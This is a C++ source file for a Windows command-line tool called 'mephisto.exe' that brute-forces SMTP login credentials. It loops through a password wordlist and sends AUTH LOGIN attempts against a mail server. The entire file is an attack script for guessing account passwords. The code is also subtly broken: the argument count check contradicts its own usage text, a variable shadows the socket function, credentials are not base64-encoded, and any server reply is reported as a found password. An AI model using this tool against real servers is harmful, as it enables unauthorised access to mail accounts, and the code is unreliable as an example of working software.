#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

void printUsage() {
    std::cout << "Usage: mephisto.exe -l <username> -P <path_to_wordlist> smtp.example.com <port>" << std::endl;
}

bool sendCommand(SOCKET socket, const std::string& command) {
    send(socket, command.c_str(), command.length(), 0);
    char buffer[512];
    int bytesReceived = recv(socket, buffer, sizeof(buffer), 0);
    if (bytesReceived > 0) {
        buffer[bytesReceived] = '\0';
        std::cout << buffer << std::endl;
        return true;
    }
    return false;
}

bool tryLogin(SOCKET socket, const std::string& username, const std::string& password) {
    std::string command = "AUTH LOGIN\r\n";
    if (!sendCommand(socket, command)) return false;

    command = username + "\r\n";
    if (!sendCommand(socket, command)) return false;

    command = password + "\r\n";
    if (!sendCommand(socket, command)) return false;

    return true;
}

bool bruteForceSMTP(const std::string& server, int port, const std::string& username, const std::string& wordlist) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed." << std::endl;
        return false;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(server.c_str());

    if (connect(socket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed." << std::endl;
        closesocket(socket);
        WSACleanup();
        return false;
    }

    char buffer[512];
    int bytesReceived = recv(socket, buffer, sizeof(buffer), 0);
    if (bytesReceived <= 0) {
        std::cerr << "Failed to receive data from the server." << std::endl;
        closesocket(socket);
        WSACleanup();
        return false;
    }
    buffer[bytesReceived] = '\0';
    std::cout << "Server Response: " << buffer << std::endl;

    std::ifstream wordlistFile(wordlist);
    if (!wordlistFile.is_open()) {
        std::cerr << "Failed to open wordlist." << std::endl;
        closesocket(socket);
        WSACleanup();
        return false;
    }

    std::string password;
    while (std::getline(wordlistFile, password)) {
        if (tryLogin(socket, username, password)) {
            std::cout << "KEY FOUND: " << password << std::endl;
            closesocket(socket);
            WSACleanup();
            return true;
        }
    }

    std::cout << "KEY NOT FOUND" << std::endl;
    closesocket(socket);
    WSACleanup();
    return false;
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        printUsage();
        return 1;
    }

    std::string username;
    std::string wordlist;
    std::string server;
    int port;

    for (int i = 1; i < argc; i++) {
        if (std::string(argv[i]) == "-l") {
            username = argv[++i];
        } else if (std::string(argv[i]) == "-P") {
            wordlist = argv[++i];
        } else if (std::string(argv[i]).find("smtp.") != std::string::npos) {
            server = argv[i];
        } else {
            port = std::stoi(argv[i]);
        }
    }

    if (username.empty() || wordlist.empty() || server.empty() || port == 0) {
        printUsage();
        return 1;
    }

    return bruteForceSMTP(server, port, username, wordlist) ? 0 : 1;
}
